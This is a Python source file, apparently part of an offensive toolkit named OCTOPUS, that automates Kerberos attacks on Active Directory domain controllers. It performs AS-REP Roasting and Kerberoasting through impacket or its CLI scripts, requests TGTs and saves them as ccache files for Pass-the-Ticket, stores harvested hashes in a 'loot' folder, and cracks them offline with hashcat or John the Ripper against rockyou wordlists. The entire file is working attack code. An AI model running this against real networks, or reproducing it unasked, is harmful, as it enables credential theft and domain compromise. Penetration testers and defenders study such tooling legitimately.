#!/usr/bin/env python3
"""
Kerberos attack module for the OCTOPUS kill chain.

Provides AS-REP Roasting, Kerberoasting, ticket extraction, and offline
cracking using hashcat or John the Ripper.  Primary backend is impacket;
CLI tools are used as a fallback.

Usage::

    from core.killchain.ad.kerberos import kerberoast, asrep_roast
    hashes = kerberoast("10.10.10.100", creds={"user": "svc", "password": "P@ss", "domain": "CORP"})
"""

import logging
import os
import shutil
import subprocess
from typing import Optional

# ── Logging ──────────────────────────────────────────────────────────────
logger = logging.getLogger("octopus.killchain.ad.kerberos")

# ── ANSI Colors ──────────────────────────────────────────────────────────
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_GREY = "\033[90m"
C_BLUE = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"

# ── Constants ────────────────────────────────────────────────────────────
DEFAULT_LOOT_BASE = os.path.expanduser("~/OCTOPUS/loot")
HASHCAT_KERBEROAST_MODE = "13100"
HASHCAT_ASREP_MODE = "18200"
IMPACKET_TIMEOUT = 120
CLI_TIMEOUT = 300


# Internal helpers

def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
    """Return a dict with guaranteed keys: user, password, domain, nthash."""
    defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
    if creds:
        defaults.update(creds)
    return defaults


def _loot_dir(target: str) -> str:
    """Return (and create) a per-target loot directory for Kerberos files."""
    path = os.path.join(DEFAULT_LOOT_BASE, target.replace(".", "_"), "kerberos")
    os.makedirs(path, exist_ok=True)
    return path


def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
    """Execute a shell command and return combined stdout+stderr."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        logger.warning("CLI command timed out: %s", cmd[:80])
        return f"[!] Command timed out after {timeout}s"
    except FileNotFoundError:
        return "[!] Command not found"
    except Exception as exc:
        logger.error("CLI command failed: %s", exc)
        return f"[!] Command error: {exc}"


# AS-REP Roasting

def asrep_roast(
    target: str,
    userlist: Optional[list[str]] = None,
    creds: Optional[dict[str, str]] = None,
) -> str:
    """Perform AS-REP Roasting to find accounts with Kerberos pre-auth disabled.

    Tries impacket's ``GetNPUsers`` module first, then the CLI ``GetNPUsers.py``.

    Args:
        target: DC IP or hostname.
        userlist: Optional list of usernames to test.  When *None*, an
                  authenticated LDAP query (via *creds*) is used to
                  discover candidate accounts automatically.
        creds: Credential dict (``user``, ``password``, ``domain``).

    Returns:
        Formatted result string with discovered AS-REP hashes.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[KERBEROS] AS-REP Roasting — {target}{C_RESET}")
    output = f"[AS-REP ROAST — {target}]\n{'═' * 60}\n\n"

    if not creds["domain"]:
        output += "[!] Domain name required for AS-REP Roasting.\n"
        return output

    loot = _loot_dir(target)
    hash_file = os.path.join(loot, "asrep_hashes.txt")

    # ── Try impacket ──────────────────────────────────────────────
    try:
        from impacket.krb5 import constants as krb5_constants  # noqa: F401
        from impacket.krb5.kerberosv5 import getKerberosTGT  # noqa: F401 - availability check
    except ImportError:
        logger.debug("impacket not available for AS-REP Roasting")
    else:
        # Build userlist file if provided
        userlist_path = ""
        if userlist:
            userlist_path = os.path.join(loot, "asrep_users.txt")
            with open(userlist_path, "w") as fh:
                fh.write("\n".join(userlist))

        try:
            from impacket.examples.GetNPUsers import GetNPUsers  # type: ignore[import-untyped]

            # impacket GetNPUsers expects an argparse-style namespace
            class _Args:
                """Minimal namespace to drive GetNPUsers."""
                def __init__(self) -> None:
                    self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}"
                    self.dc_ip = target
                    self.request = True
                    self.format = "hashcat"
                    self.usersfile = userlist_path or None
                    self.outputfile = hash_file
                    self.no_pass = not creds["password"]
                    self.hashes = f":{creds['nthash']}" if creds["nthash"] else None
                    self.debug = False
                    self.ts = False

            runner = GetNPUsers(_Args())
            runner.run()

            if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
                with open(hash_file) as fh:
                    hashes = fh.read()
                count = len(hashes.strip().splitlines())
                output += f"[+] {count} AS-REP hash(es) extracted → {hash_file}\n"
                output += f"{hashes[:2000]}\n"
                print(f"    {C_GREEN}[+] {count} AS-REP hash(es) found!{C_RESET}")
            else:
                output += "[-] No accounts vulnerable to AS-REP Roasting.\n"
            return output
        except ImportError:
            logger.debug("GetNPUsers class not importable — trying CLI")
        except Exception as exc:
            logger.warning("impacket AS-REP Roast failed: %s", exc)
            output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
    if cli_bin:
        user_arg = ""
        if userlist:
            userlist_path = os.path.join(loot, "asrep_users.txt")
            with open(userlist_path, "w") as fh:
                fh.write("\n".join(userlist))
            user_arg = f"-usersfile {userlist_path}"

        auth = f'{creds["domain"]}/{creds["user"]}:{creds["password"]}'
        cmd = (
            f'{cli_bin} "{auth}" -dc-ip {target} -request '
            f'-format hashcat -outputfile {hash_file} {user_arg}'
        )
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:2000]}\n"

        if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
            with open(hash_file) as fh:
                output += f"\n{fh.read()[:2000]}\n"
    else:
        output += "[!] No impacket GetNPUsers available. Install impacket.\n"

    return output


# Kerberoasting

def kerberoast(target: str, creds: Optional[dict[str, str]] = None) -> str:
    """Kerberoast — request TGS tickets for service accounts and crack offline.

    Tries impacket's ``GetUserSPNs`` first, then the CLI.

    Args:
        target: DC IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``).

    Returns:
        Formatted result string with service-ticket hashes.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[KERBEROS] Kerberoasting — {target}{C_RESET}")
    output = f"[KERBEROAST — {target}]\n{'═' * 60}\n\n"

    if not creds["user"] or not creds["domain"]:
        output += "[!] Authenticated domain credentials required for Kerberoasting.\n"
        return output

    loot = _loot_dir(target)
    hash_file = os.path.join(loot, "kerberoast_hashes.txt")

    # ── Try impacket ──────────────────────────────────────────────
    try:
        from impacket.examples.GetUserSPNs import GetUserSPNs  # type: ignore[import-untyped]

        class _Args:
            """Minimal namespace to drive GetUserSPNs."""
            def __init__(self) -> None:
                self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}"
                self.dc_ip = target
                self.request = True
                self.outputfile = hash_file
                self.hashes = f":{creds['nthash']}" if creds["nthash"] else None
                self.debug = False
                self.ts = False
                self.save = False
                self.target_domain = creds["domain"]

        runner = GetUserSPNs(_Args())
        runner.run()

        if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
            with open(hash_file) as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] {count} Kerberoast hash(es) extracted → {hash_file}\n"
            output += f"{hashes[:3000]}\n"
            print(f"    {C_GREEN}[+] {count} Kerberoast hash(es) found!{C_RESET}")
        else:
            output += "[-] No kerberoastable service accounts found.\n"
        return output
    except ImportError:
        logger.debug("GetUserSPNs not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket Kerberoast failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
    if cli_bin:
        auth = f'{creds["domain"]}/{creds["user"]}:{creds["password"]}'
        cmd = (
            f'{cli_bin} "{auth}" -dc-ip {target} '
            f'-request -outputfile {hash_file}'
        )
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:2000]}\n"

        if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
            with open(hash_file) as fh:
                output += f"\n{fh.read()[:2000]}\n"
    else:
        output += "[!] No impacket GetUserSPNs available. Install impacket.\n"

    return output


# Ticket extraction

def extract_tickets(target: str, creds: Optional[dict[str, str]] = None) -> str:
    """Extract TGT/TGS tickets from memory or request new ones via impacket.

    Uses ``getTGT`` from impacket to request a TGT for the supplied
    credentials, then saves the ``.ccache`` file for later use with
    Pass-the-Ticket.

    Args:
        target: DC IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``).

    Returns:
        Formatted result string with ticket file path.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_CYAN}[KERBEROS] Extracting tickets — {target}{C_RESET}")
    output = f"[TICKET EXTRACTION — {target}]\n{'═' * 60}\n\n"

    if not creds["user"] or not creds["domain"]:
        output += "[!] Domain credentials required for ticket extraction.\n"
        return output

    loot = _loot_dir(target)
    ccache_file = os.path.join(loot, f"{creds['user']}.ccache")

    # ── Try impacket getTGT ───────────────────────────────────────
    try:
        from impacket.krb5 import constants as krb5_constants
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal

        logger.info("Requesting TGT via impacket for %s@%s", creds["user"], creds["domain"])
        user_principal = Principal(
            creds["user"],
            type=krb5_constants.PrincipalNameType.NT_PRINCIPAL.value,
        )

        tgt, cipher, old_session_key, _session_key = getKerberosTGT(
            user_principal,
            creds["password"],
            creds["domain"],
            lmhash=b"",
            nthash=bytes.fromhex(creds["nthash"]) if creds["nthash"] else b"",
            kdcHost=target,
        )

        # Save as ccache
        from impacket.krb5.ccache import CCache

        ccache = CCache()
        ccache.fromTGT(tgt, old_session_key, old_session_key)
        ccache.saveFile(ccache_file)

        output += f"[+] TGT obtained and saved → {ccache_file}\n"
        output += f"    User:   {creds['user']}@{creds['domain']}\n"
        output += f"    Cipher: {cipher.enctype}\n"
        output += f"  Export with: export KRB5CCNAME={ccache_file}\n"
        print(f"    {C_GREEN}[+] TGT saved to {ccache_file}{C_RESET}")
        return output
    except ImportError:
        logger.debug("impacket Kerberos modules not available")
    except Exception as exc:
        logger.warning("impacket getTGT failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("getTGT.py") or shutil.which("impacket-getTGT")
    if cli_bin:
        auth = f'{creds["domain"]}/{creds["user"]}:{creds["password"]}'
        cmd = f'{cli_bin} "{auth}" -dc-ip {target}'
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:2000]}\n"

        # impacket writes .ccache in CWD — move to loot
        default_ccache = f"{creds['user']}.ccache"
        if os.path.isfile(default_ccache):
            shutil.move(default_ccache, ccache_file)
            output += f"[+] TGT saved → {ccache_file}\n"
    else:
        output += "[!] No impacket getTGT available. Install impacket.\n"

    return output


# Ticket cracking

def crack_tickets(
    ticket_file: str,
    wordlist: str = "",
    mode: str = "kerberoast",
) -> str:
    """Crack Kerberos ticket hashes offline using hashcat or John the Ripper.

    Args:
        ticket_file: Path to a file containing hashcat-format hashes.
        wordlist: Path to a wordlist file.  If empty, common locations
                  such as ``/usr/share/wordlists/rockyou.txt`` are tried.
        mode: One of ``"kerberoast"`` or ``"asrep"`` to select the
              correct hashcat mode.

    Returns:
        Formatted result string with cracking output.
    """
    print(f"\n  {C_RED}[KERBEROS] Cracking tickets — {ticket_file}{C_RESET}")
    output = f"[TICKET CRACKING]\n{'═' * 60}\n\n"

    if not os.path.isfile(ticket_file):
        output += f"[!] Ticket file not found: {ticket_file}\n"
        return output

    # Resolve wordlist
    if not wordlist or not os.path.isfile(wordlist):
        common_wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
            "/opt/wordlists/rockyou.txt",
        ]
        for wl in common_wordlists:
            if os.path.isfile(wl):
                wordlist = wl
                break

    if not wordlist or not os.path.isfile(wordlist):
        output += "[!] No wordlist found. Provide a wordlist path.\n"
        return output

    hashcat_mode = HASHCAT_KERBEROAST_MODE if mode == "kerberoast" else HASHCAT_ASREP_MODE

    # ── Try hashcat ───────────────────────────────────────────────
    if shutil.which("hashcat"):
        print(f"    {C_CYAN}[*] Cracking with hashcat (mode {hashcat_mode})...{C_RESET}")
        potfile = ticket_file + ".potfile"
        cmd = (
            f"hashcat -m {hashcat_mode} {ticket_file} {wordlist} "
            f"--potfile-path {potfile} --force --quiet"
        )
        cli_out = _run_cli(cmd, timeout=CLI_TIMEOUT)
        output += f"[hashcat]\n{cli_out[:3000]}\n"

        # Show cracked results
        show_cmd = f"hashcat -m {hashcat_mode} {ticket_file} --show --potfile-path {potfile} --quiet"
        cracked = _run_cli(show_cmd, timeout=30)
        if cracked and "[!]" not in cracked:
            output += f"\n[+] CRACKED HASHES:\n{cracked[:2000]}\n"
            print(f"    {C_GREEN}[+] Hashes cracked!{C_RESET}")
        return output

    # ── Try John the Ripper ───────────────────────────────────────
    john_bin = shutil.which("john") or shutil.which("john-the-ripper")
    if john_bin:
        print(f"    {C_CYAN}[*] Cracking with John the Ripper...{C_RESET}")
        cmd = f"{john_bin} {ticket_file} --wordlist={wordlist} --format=krb5tgs"
        if mode == "asrep":
            cmd = f"{john_bin} {ticket_file} --wordlist={wordlist} --format=krb5asrep"
        cli_out = _run_cli(cmd, timeout=CLI_TIMEOUT)
        output += f"[john]\n{cli_out[:3000]}\n"

        show_cmd = f"{john_bin} {ticket_file} --show"
        cracked = _run_cli(show_cmd, timeout=30)
        if cracked and "[!]" not in cracked:
            output += f"\n[+] CRACKED:\n{cracked[:2000]}\n"
            print(f"    {C_GREEN}[+] Hashes cracked!{C_RESET}")
        return output

    output += "[!] Neither hashcat nor john found in PATH.\n"
    return output
